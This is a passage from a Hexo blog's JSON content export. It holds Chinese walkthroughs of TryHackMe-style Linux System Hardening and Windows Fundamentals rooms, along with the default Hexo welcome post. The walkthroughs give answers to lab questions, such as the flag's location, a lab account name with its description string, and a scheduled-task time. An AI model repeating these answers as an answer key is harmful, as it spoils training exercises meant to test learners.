组。某些发行版（例如 Debian 和 Ubuntu）将 sudoers 称为组<strong>sudo</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usermod -aG sudo username</span><br></pre></td></tr></table></figure>\n\n<p>其他发行版（例如 RedHat 和 Fedora）将 sudoers 组称为<strong>wheel</strong>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">usermod -aG wheel username  </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"禁用未使用的用户\"><a href=\"#禁用未使用的用户\" class=\"headerlink\" title=\"禁用未使用的用户\"></a>禁用未使用的用户</h3><p>一种简单的方法是编辑<strong>&#x2F;etc&#x2F;passwd</strong>文件并将我们要禁用的用户帐户的 shell 设置为&#x2F;sbin&#x2F;nologin。</p>\n<h3 id=\"禁用-root\"><a href=\"#禁用-root\" class=\"headerlink\" title=\"禁用 root\"></a>禁用 root</h3><p>一旦创建了用于管理目的的帐户并将其添加到<strong>sudo&#x2F;wheel</strong>组，您可能会考虑禁用该root帐户。<br>一种直接的方法是修改<strong>&#x2F;etc&#x2F;passwd</strong> 将 shell 更改root为<strong>&#x2F;sbin&#x2F;nologin</strong>。换句话说，编辑&#x2F;etc&#x2F;passwd并将行更改<strong>bin&#x2F;bash</strong> 为 <strong>&#x2F;sbin&#x2F;nologin</strong>。</p>\n<p>我们看看题目</p>\n<p><img src=\"/images/Linux%20System%20Hardening/task6.png\" alt=\"task6\"></p>\n<p>第一题&#x2F;sbin&#x2F;nologin</p>\n<p>第二题很显而易见 wheel</p>\n<p>第三题sudo</p>\n<p>第四题 问sudo组里面还有谁 我们之间grep一下&#x2F;etc&#x2F;group就可以知道1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat group | grep sudo</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20System%20Hardening/group.png\" alt=\"group\"></p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>软件和服务</p>\n<p>系统上安装的每款软件都会增加潜在漏洞的数量。换句话说，安装额外的软件包和新服务会增加攻击者可利用的漏洞，从而访问系统，并最终访问网络上的其他系统。</p>\n<ul>\n<li><p>禁用不必要的服务<br>改善安全状况的最简单方法之一是删除或禁用不需要的服务和软件包。每个软件包都有一定的风险，而且我们无法知道何时会发现相关的漏洞。</p>\n</li>\n<li><p>阻止不需要的网络端口<br>删除所有不需要的软件包并禁用可能不会被删除的预安装服务后，相应地设置防火墙规则至关重要。</p>\n</li>\n<li><p>避免使用遗留协议<br>过去，Telnet 曾是远程访问系统的主要协议；TFTP 协议通常用于传输文件。随着安全替代方案的发布，不应再允许使用此类协议。</p>\n</li>\n<li><p>eg：<br>SSH协议现已广泛使用，取代了 Telnet 。例如，安全文件传输议 (<strong>SFTP</strong>) 协议为 TFTP 协议提供了很好的替代方案。关键在选择和使用安全的替代方案。</p>\n</li>\n<li><p>删除识别字符串<br>每当你连接到远程服务器时，它通常会回复其版本号。此信息会向攻击者透露各种信息，例如服务器&#x2F;程序的名称、版本号和主机操作系统。</p>\n</li>\n</ul>\n<p>根据上面的文字 能知道 task7的答案是sftp(替代了tftp)</p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>升级和更新策略<br>以下两个命令更新基于 Debian 的发行版，例如 Ubuntu：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt update从配置的源下载包信息</span><br><span class=\"line\">apt upgrade从配置的源安装所有软件包的可用升级</span><br></pre></td></tr></table></figure>\n\n<p>以下命令更新 RedHat 或 Fedora 系统：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dnf update在较新版本上（Red Hat Enterprise Linux 8 及更高版本）</span><br><span class=\"line\">yum update在旧版本上（Red Hat Enterprise Linux 7 及更早版本）</span><br></pre></td></tr></table></figure>\n<p>这个是题目</p>\n<p><img src=\"/images/Linux%20System%20Hardening/task8.png\" alt=\"task8\"></p>\n<p>前面几题其实就是基础知识 百度啥的都可以知道 直接复制粘贴就完了</p>\n<p>最后一题的话 进&#x2F;etc&#x2F;apt&#x2F;source.list就可以看到flag</p>\n<p><img src=\"/images/Linux%20System%20Hardening/source.png\" alt=\"source\"></p>\n<h2 id=\"task9\"><a href=\"#task9\" class=\"headerlink\" title=\"task9\"></a>task9</h2><p><img src=\"/source/images/Linux%20System%20Hardening/task9.png\" alt=\"task9\"></p>\n<p>这两天就是看你的<strong>tail</strong>和<strong>grep</strong>命令的使用了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tail -n 15 kern.log</span><br><span class=\"line\">grep denied source</span><br></pre></td></tr></table></figure>\n<p>结束这场战斗了 算比较深一点点了解linux在安全上的各种措施。要把这些用在实际的地方在是关键</p>\n"},{"title":"Hello World","top_img":"transparent","_content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ntop_img: transparent\n---\nWelcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n","slug":"hello-world","published":1,"date":"2024-12-29T02:30:31.933Z","updated":"2024-12-30T13:39:10.086Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxd000atsg66y4ohbd5","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n","excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"Windows Fundamentals 1~3教程","date":"2025-01-18T00:47:40.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/01/19/MHICLXqONb38YnW.png","_content":"现在搞一个比较简单的windows Fundamentals 其实Windows我也是学习中 基本的功能也算半桶水\n\n## windows基本功能1\n现在是windows基本功能1 只能说基础 得打牢\n\n就是了解了解windows的功能 各种系统自带的程序的作用\n\n![1](/images/Windows%20Fundamentals%201教程/1.png)\n\n\n### task2\ntask2就跳过了 无法启用bitlocker\n\n### task3\n讲的是桌面的组成 桌面又称为图形用户界面或简称GUI\n\n分为一下几个部分\n- 桌面\n- 开始菜单\n- 搜索框（Cortana）\n- 任务视图\n- 任务栏\n- 工具栏\n- 通知区域\n\n我们看看问题\n![问题](/images/Windows%20Fundamentals%201教程/task3.png)\n\n其实这些问题很容易 就是吃了不太懂这些东西的英文叫啥\n\n#### 问题一 如何隐藏/禁用搜索框\n\n右键点击下方的空白处 调出任务栏 点search搜索 就会有个隐藏\n\n![任务栏](/images/Windows%20Fundamentals%201教程/hidden.png)\n\n#### 问题二 隐藏任务视图 \n \n还是那个地方 任务视图叫task view 点击show task view button\n\n![task](/images/Windows%20Fundamentals%201教程/show%20task.png)\n\n#### 问题三 还有哪些图标\n\n在时间和网络的旁边 有个小框框 那个就答案 名字叫做action center\n\n![tu](/images/Windows%20Fundamentals%201教程/action.png)\n\n### task4\nntfs叫做**New Technology File System**\n\n### task5\nwindows文件夹系统变量%windir%\n\n### task6\n\n![task6](/images/Windows%20Fundamentals%201教程/task6.png)\n\n看到有用户 账户 我们直接cmd 输入**lusrmgr.msc** \n\n![user](/images/Windows%20Fundamentals%201教程/other.png)\n\n一下子找到另一个用户和他的描述 第一题第四题解决\n另一个账户叫**tryhackmebilly** 描述是**window$Fun1!**\n\n点击tryhackmebilly账户 我们选到有member的选项\n\n![group](/images/Windows%20Fundamentals%201教程/mumer.png)\n\n发现是属于remote desktop user和user的用户\n\n内置账户可以用于访问访客计算机 当然是guest用户\n\n## task7\nuac是user account control 用户账户控制\n\n## task8\n\ncmd 输入**control** 进入控制列表 选择类别 小图标 最后一个是Windows defender firewall\n\n![control](/images/Windows%20Fundamentals%201教程/small.png)\n\n## task9\n\n打开任务管理器的键盘快捷键是什么\n\nctrl+shift+esc\n\n\n ## windows基本功能2\n\n接下来是windows基本功能2\n\n![2](/mages/Windows%20Fundamentals%202教程/2.png)\n\n\n## task2\n\n我们看看题目\n\n![task2](/images/Windows%20Fundamentals%202教程/task2.png)\n\n我们cmd输入**msconfig** 系统配置\n\n### 第一题\n题目是说服务 我们点开services 点一下manufacturer筛选一下 从底部开始显示 一下子就能找到 Systems Internals的服务是**psshutdown**\n\n![msc](/images/Windows%20Fundamentals%202教程/man.png)\n\n### 第二题\n题目说是Windows 我们在tool里面看 关于Windows **about Windows**点击之后点一下下面的launch\n\n![windows](/images/Windows%20Fundamentals%202教程/windowsuser.png)\n\n### 第三题\n\nWindows排除故障 我们还是在在系统配置中的tools中找到troubleshooting 点击一下 下方就有显示具体的程序\n\n![](/images/Windows%20Fundamentals%202教程/trub.png)\n\n### 第四题\n控制面板就不用多说 不用想都是control 我们真要去系统配置找的话 我们就依然在tools中找到control\n\n![contorl](/images/Windows%20Fundamentals%202教程/control.png)\n\n\n\n## task3\n我们也是在系统配置的tools进行查找\n可以发现是**UserAccountControlSettings.exe**\n\n![task3](/images/Windows%20Fundamentals%202教程/uac2.png)\n\n## task4\n\n我们看一下题目吧\n\n![task4](/images/Windows%20Fundamentals%202教程/task4.png)\n\n### 第一题\n\n第一题和之前的一样在系统配置中的tools找计算机管理 **computer management**\n\n![man](/images/Windows%20Fundamentals%202教程/compmgmt.png)\n\n### 第二题\n\n这题我们要打开计算机管理的任务计划程序 在里面找到题目要求的程序 发现是6:15am\n\n![ua](/images/Windows%20Fundamentals%202教程/ua.png)\n\n### 第三题\n我们在这个界面找到共享文件夹 点进去就可以发现答案\n\n![share](/images/Windows%20Fundamentals%202教程/share.png)\n\n## task5\n![task5](/images/Windows%20Fundamentals%202教程/task5.png)\n\n### 第一题和第二题\n\n我们又又又又在在系统配置中查找system infomation 找到之后单击launch 就可以找到第二题答案\n\n![diyiti](/images/Windows%20Fundamentals%202教程/msinfo32.png)\n\n### 第三题\n\n环境变量就在系统信息中 在cmd中输入**msinfo32** 进入系统信息 找到software enviroment的enviroment variables 就能看到ComSpec的值\n\n![disanti](images/Windows%20Fundamentals%202教程/envir.png)\n\n## task6\n\n在系统配置中的tools能找到 Resource Monitor\n\n![task6](/images/Windows%20Fundamentals%202教程/remon1.png)\n\n## task7\n\n这个题目比较ez\n\n![task7](/images/Windows%20Fundamentals%202教程/task7.png)\n\nipconfig 要展示所有细节的话 在后面加/ all\n\n```\nipconfig /all\n```\n\n## task8\n\n这一题方法与task7 第一题题方法一致\n\n\n## windows基本功能3\n\n总算来到了最后一个了 速战速决\n\n### task2\n\n![task1](/images/Windows%20Fundamentals%203教程/task1.png)\n\n第一个他问定期更新的时间是多少？我们打开设置点击更新\n![1](/images/Windows%20Fundamentals%203教程/1.png)\n\n点开更新历史 就能发现日期\n![2](/images/Windows%20Fundamentals%203教程/2.png)\n\n### task3\n\n很幸运 任务二也只有一道题\n![task2](/images/Windows%20Fundamentals%203教程/task2.png)\n\n打开设置找到Windows security这个选项 你就可以发现答案\n\n![task22](/images/Windows%20Fundamentals%203教程/proten.png)\n\n### task4\n\n![task4](/images/Windows%20Fundamentals%203教程/task4.png)\n\n一开始看这道题看得一头雾水的 不知道说啥 先不管他 我们上面已经打开了virus&threat protection\n\n![4](/images/Windows%20Fundamentals%203教程/dakai.png)\n\n接着点开manage setting 就会发现就是实时保护(real-time protection) \n本人因为我的世界就被这个老六sha掉了 害我的存档之间没了\n\n![4](/images/Windows%20Fundamentals%203教程/dakai2.png)\n\n### task5\n![task5](/images/Windows%20Fundamentals%203教程/task5.png)\n\n机场wifi毫无疑问就是公共网络 public network\n\n### task6\n\n就是给你读的 \n\n讲了Microsoft Defender SmartScreen的作用\n\n### task7\ntpm就是Trusted Platform Module\n\n### task8\n\nBitLocker 与受信任平台模块 (TPM) 一起使用时可提供最大程度的保护\n\nBitLocker 驱动器加密是一种与操作系统集成的数据保护功能，可解决因计算机丢失、被盗或不当退役而导致的数据盗窃或泄露威胁\n\n![task8](/images/Windows%20Fundamentals%203教程/task8.png)\n\n我们查看微软官方文档可以知道 没有tpm的需要准备a startup key\n\n![8](/images/Windows%20Fundamentals%203教程/8.png)\n\n### task 9\n\n卷影复制服务 (VSS) 协调所需的操作来创建要备份的数据的一致卷影副本（也称为快照或时间点副本）。 \n\n卷影副本存储在每个启用了保护的驱动器上的系统卷信息文件夹中。\n\n如果启用了 VSS(打开了系统保护)，您可以在高级系统设置中执行以下任务。 \n\n- 创建还原点\n- 执行系统还原\n- 配置恢复设置\n- 删除还原点\n\n![9](/images/Windows%20Fundamentals%203教程/9.png)\n\n\n终于我们把所有的Windows function搞完了 基础篇 不难 主要是给我们熟悉一下操作和常用的程序 Windows安全工具 可以用来检查安全事件","source":"_posts/Windows-Fundamentals-1教程.md","raw":"---\ntitle: Windows Fundamentals 1~3教程\ndate: 2025-01-18 08:47:40\ntags: windows 基础\ntop_img: transparent\ncover: https://s2.loli.net/2025/01/19/MHICLXqONb38YnW.png\n---\n现在搞一个比较简单的windows Fundamentals 其实Windows我也是学习中 基本的功能也算半桶水\n\n## windows基本功能1\n现在是windows基本功能1 只能说基础 得打牢\n\n就是了解了解windows的功能 各种系统自带的程序的作用\n\n![1](/images/Windows%20Fundamentals%201教程/1.png)\n\n\n### task2\ntask2就跳过了 无法启用bitlocker\n\n### task3\n讲的是桌面的组成 桌面又称为图形用户界面或简称GUI\n\n分为一下几个部分\n- 桌面\n- 开始菜单\n- 搜索框（Cortana）\n- 任务视图\n- 任务栏\n- 工具栏\n- 通知区域\n\n我们看看问题\n![问题](/images/Windows%20Fundamentals%201教程/task3.png)\n\n其实这些问题很容易 就是吃了不太懂这些东西的英文叫啥\n\n#### 问题一 如何隐藏/禁用搜索框\n\n右键点击下方的空白处 调出任务栏 点search搜索 就会有个隐藏\n\n![任务栏](/images/Windows%20Fundamentals%201教程/hidden.png)\n\n#### 问题二 隐藏任务视图 \n \n还是那个地方 任务视图叫task view 点击show task view button\n\n![task](/images/Windows%20Fundamentals%201教程/show%20task.png)\n\n#### 问题三 还有哪些图标\n\n在时间和网络的旁边 有个小框框 那个就答案 名字叫做action center\n\n![tu](/images/Windows%20Fundamentals%201教程/action.png)\n\n### task4\nntfs叫做**New Technology File System**\n\n### task5\nwindows文件夹系统变量%windir%\n\n### task6\n\n![task6](/images/Windows%20Fundamentals%201教程/task6.png)\n\n看到有用户 账户 我们直接cmd 输入**lusrmgr.msc** \n\n![user](/images/Windows%20Fundamentals%201教程/other.png)\n\n一下子找到另一个用户和他的描述 第一题第四题解决\n另一个账户叫**tryhackmebilly** 描述是**window$Fun1!**\n\n点击tryhackmebilly账户 我们选到有member的选项\n\n![group](/images/Windows%20Fundamentals%201教程/mumer.png)\n\n发现是属于remote desktop user和user的用户\n\n内置账户可以用于访问访客计算机 当然是guest用户\n\n## task7\nuac是user account control 用户账户控制\n\n## task8\n\ncmd 输入**control** 进入控制列表 选择类别 小图标 最后一个是Windows defender firewall\n\n![control](/images/Windows%20Fundamentals%201教程/small.png)\n\n## task9\n\n打开任务管理器的键盘快捷键是什么\n\nctrl+shift+esc\n\n\n ## windows基本功能2\n\n接下来是windows基本功能2\n\n![2](/mages/Windows%20Fundamentals%202教程/2.png)\n\n\n## task2\n\n我们看看题目\n\n![task2](/images/Windows%20Fundamentals%202教程/task2.png)\n\n我们cmd输入**msconfig** 系统配置\n\n### 第一题\n题目是说服务 我们点开services 点一下manufacturer筛选一下 从底部开始显示 一下子就能找到 Systems Internals的服务是**psshutdown**\n\n![msc](/images/Windows%20Fundamentals%202教程/man.png)\n\n### 第二题\n题目说是Windows 我们在tool里面看 关于Windows **about Windows**点击之后点一下下面的launch\n\n![windows](/images/Windows%20Fundamentals%202教程/windowsuser.png)\n\n### 第三题\n\nWindows排除故障 我们还是在在系统配置中的tools中找到troubleshooting 点击一下 下方就有显示具体的程序\n\n![](/images/Windows%20Fundamentals%202教程/trub.png)\n\n### 第四题\n控制面板就不用多说 不用想都是control 我们真要去系统配置找的话 我们就依然在tools中找到control\n\n![contorl](/images/Windows%20Fundamentals%202教程/control.png)\n\n\n\n## task3\n我们也是在系统配置的tools进行查找\n可以发现是**UserAccountControlSettings.exe**\n\n![task3](/images/Windows%20Fundamentals%202教程/uac2.png)\n\n## task4\n\n我们看一下题目吧\n\n![task4](/images/Windows%20Fundamentals%202教程/task4.png)\n\n### 第一题\n\n第一题和之前的一样在系统配置中的tools找计算机管理 **computer management**\n\n![man](/images/Windows%20Fundamentals%202教程/compmgmt.png)\n\n### 第二题\n\n这题我们要打开计算机管理的任务计划程序 在里面找到题目要求的程序 发现是6:15am\n\n![ua](/images/Windows%20Fundamentals%202教程/ua.png)\n\n### 第三题\n我们在这个界面找到共享文件夹 点进去就可以发现答案\n\n![share](/images/Windows%20Fundamentals%202教程/share.png)\n\n## task5\n![task5](/images/Windows%20Fundamentals%202教程/task5.png)\n\n### 第一题和第二题\n\n我们又又又又在在系统配置中查找system infomation 找到之后单击launch 就可以找到第二题答案\n\n![diyiti](/images/Windows%20Fundamentals%202教程/msinfo32.png)\n\n### 第三题\n\n环境变量就在系统信息中 在cmd中输入**msinfo32** 进入系统信息 找到software enviroment的enviroment variables 就能看到ComSpec的值\n\n![disanti](images/Windows%20Fundamentals%202教程/envir.png)\n\n## task6\n\n在系统配置中的tools能找到 Resource Monitor\n\n![task6](/images/Windows%20Fundamentals%202教程/remon1.png)\n\n## task7\n\n这个题目比较ez\n\n![task7](/images/Windows%20Fundamentals%202教程/task7.png)\n\nipconfig 要展示所有细节的话 在后面加/ all\n\n```\nipconfig /all\n```\n\n## task8\n\n这一题方法与task7 第一题题方法一致\n\n\n## windows基本功能3\n\n总算来到了最后一个了 速战速决\n\n### task2\n\n![task1](/images/Windows%20Fundamentals%203教程/task1.png)\n\n第一个他问定期更新的时间是多少？我们打开设置点击更新\n![1](/images/Windows%20Fundamentals%203教程/1.png)\n\n点开更新历史 就能发现日期\n![2](/images/Windows%20Fundamentals%203教程/2.png)\n\n### task3\n\n很幸运 任务二也只有一道题\n![task2](/images/Windows%20Fundamentals%203教程/task2.png)\n\n打开设置找到Windows security这个选项 你就可以发现答案\n\n![task22](/images/Windows%20Fundamentals%203教程/proten.png)\n\n### task4\n\n![task4](/images/Windows%20Fundamentals%203教程/task4.png)\n\n一开始看这道题看得一头雾水的 不知道说啥 先不管他 我们上面已经打开了virus&threat protection\n\n![4](/images/Windows%20Fundamentals%203教程/dakai.png)\n\n接着点开manage setting 就会发现就是实时保护(real-time protection) \n本人因为我的世界就被这个老六sha掉了 害我的存档之间没了\n\n![4](/images/Windows%20Fundamentals%203教程/dakai2.png)\n\n### task5\n![task5](/images/Windows%20Fundamentals%203教程/task5.png)\n\n机场wifi毫无疑问就是公共网络 public network\n\n### task6\n\n就是给你读的 \n\n讲了Microsoft Defender SmartScreen的作用\n\n### task7\ntpm就是Trusted Platform Module\n\n### task8\n\nBitLocker 与受信任平台模块 (TPM) 一起使用时可提供最大程度的保护\n\nBitLocker 驱动器加密是一种与操作系统集成的数据保护功能，可解决因计算机丢失、被盗或不当退役而导致的数据盗窃或泄露威胁\n\n![task8](/images/Windows%20Fundamentals%203教程/task8.png)\n\n我们查看微软官方文档可以知道 没有tpm的需要准备a startup key\n\n![8](/images/Windows%20Fundamentals%203教程/8.png)\n\n### task 9\n\n卷影复制服务 (VSS) 协调所需的操作来创建要备份的数据的一致卷影副本（也称为快照或时间点副本）。 \n\n卷影副本存储在每个启用了保护的驱动器上的系统卷信息文件夹中。\n\n如果启用了 VSS(打开了系统保护)，您可以在高级系统设置中执行以下任务。 \n\n- 创建还原点\n- 执行系统还原\n- 配置恢复设置\n- 删除还原点\n\n![9](/images/Windows%20Fundamentals%203教程/9.png)\n\n\n终于我们把所有的Windows function搞完了 基础篇 不难 主要是给我们熟悉一下操作和常用的程序 Windows安全工具 可以用来检查安全事件","slug":"Windows-Fundamentals-1教程","published":1,"updated":"2025-01-20T10:23:22.847Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxe000etsg6b0n492gj","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>现在搞一个比较简单的windows Fundamentals 其实Windows我也是学习中 基本的功能也算半桶水</p>\n<h2 id=\"windows基本功能1\"><a href=\"#windows基本功能1\" class=\"headerlink\" title=\"windows基本功能1\"></a>windows基本功能1</h2><p>现在是windows基本功能1 只能说基础 得打牢</p>\n<p>就是了解了解windows的功能 各种系统自带的程序的作用</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/1.png\" alt=\"1\"></p>\n<h3 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p>task2就跳过了 无法启用bitlocker</p>\n<h3 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p>讲的是桌面的组成 桌面又称为图形用户界面或简称GUI</p>\n<p>分为一下几个部分</p>\n<ul>\n<li>桌面</li>\n<li>开始菜单</li>\n<li>搜索框（Cortana）</li>\n<li>任务视图</li>\n<li>任务栏</li>\n<li>工具栏</li>\n<li>通知区域</li>\n</ul>\n<p>我们看看问题<br><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/task3.png\" alt=\"问题\"></p>\n<p>其实这些问题很容易 就是吃了不太懂这些东西的英文叫啥</p>\n<h4 id=\"问题一-如何隐藏-禁用搜索框\"><a href=\"#问题一-如何隐藏-禁用搜索框\" class=\"headerlink\" title=\"问题一 如何隐藏&#x2F;禁用搜索框\"></a>问题一 如何隐藏&#x2F;禁用搜索框</h4><p>右键点击下方的空白处 调出任务栏 点search搜索 就会有个隐藏</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/hidden.png\" alt=\"任务栏\"></p>\n<h4 id=\"问题二-隐藏任务视图\"><a href=\"#问题二-隐藏任务视图\" class=\"headerlink\" title=\"问题二 隐藏任务视图\"></a>问题二 隐藏任务视图</h4><p>还是那个地方 任务视图叫task view 点击show task view button</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/show%20task.png\" alt=\"task\"></p>\n<h4 id=\"问题三-还有哪些图标\"><a href=\"#问题三-还有哪些图标\" class=\"headerlink\" title=\"问题三 还有哪些图标\"></a>问题三 还有哪些图标</h4><p>在时间和网络的旁边 有个小框框 那个就答案 名字叫做action center</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/action.png\" alt=\"tu\"></p>\n<h3 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p>ntfs叫做<strong>New Technology File System</strong></p>\n<h3 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p>windows文件夹系统变量%windir%</p>\n<h3 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/task6.png\" alt=\"task6\"></p>\n<p>看到有用户 账户 我们直接cmd 输入<strong>lusrmgr.msc</strong> </p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/other.png\" alt=\"user\"></p>\n<p>一下子找到另一个用户和他的描述 第一题第四题解决<br>另一个账户叫<strong>tryhackmebilly</strong> 